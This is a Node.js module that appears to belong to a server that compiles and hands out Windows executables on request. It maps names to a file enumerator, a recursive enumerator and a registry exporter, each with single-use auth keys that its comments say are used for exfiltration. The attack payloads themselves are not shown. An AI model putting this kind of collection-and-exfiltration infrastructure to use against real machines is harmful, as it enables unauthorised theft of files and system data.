const path = require("path");

/**
 * Creates an EXEData object that will store all the necessary data that corresponds to a requested EXE string provided by the HTTP EXE parameter.
 * ELI5 definition: when the user requests a certain EXE, this class contains the data for said EXE.
 * @param {String} cPath Path to the C file (that we will compile upon request). This should be relative.
 * @param {Boolean} usesAuthKey Whether this EXE requires an POST request AuthKey to be generated (usually for exfiltration)
 * @param {Boolean} singleUse Whether the auth key should be single use
 * @param {Function} postFunction {Optional} (postRequest) => {}  A function that processes an incoming POST request associated with the EXE String. DO NOT HANDLE REQUEST ITSELF.
 */
const EXEData = function(cPath, usesAuthKey, singleUse, postFunction) {

    /**
     * Absolute path to the EXE file
     * @type {String}
     */
    this.cPath = path.resolve(__dirname, cPath);

    /**
     * Not to be confused with CDIR lol, but this contains the directory path that contains the EXE file
     * @type {String}
     */
    this.cDir = path.dirname(this.cPath);

    /**
     * Whether this EXE requires an POST request AuthKey to be generated (usually for exfiltration)
     * @type {Boolean}
     */
    this.usesAuthKey = usesAuthKey;

    /**
     * If this EXE requires an auth key, this determines whether or not it's single use
     * @type {Boolean}
     */
    this.singleUse = singleUse || false;

    /**
     * The function that processes an incoming POST Request associated with this EXE.
     * If no function is provided, this is set to a function that does nothing.
     * @type {Function}
     */
    this.postFunction = postFunction || function() {};
}

/**
 * A JSON that maps EXE parameters we recieve from the Router to server-side paths.
 * Our server will then compile the C file in the server-side path, and then return it.
 * Will probably get yelled at by the Leetcode crowd because this is very "unoptimized" but I'm a Cybersecurity guy so this is gonna stay bc I don't trust user input
 */
module.exports = {
    enumerator: new EXEData("./Executables/Enumerator/ls_read.exe", true, true, require("./POST Functions/ls_read")),
    enumeratorRecursive: new EXEData("./Executables/EnumeratorRecursive/enumerator.exe", true, true, require("./POST Functions/ls_read_recursive")),
    regexport: new EXEData("./Executables/RegExport/regexport.exe", true, true, require("./POST Functions/regexport"))
};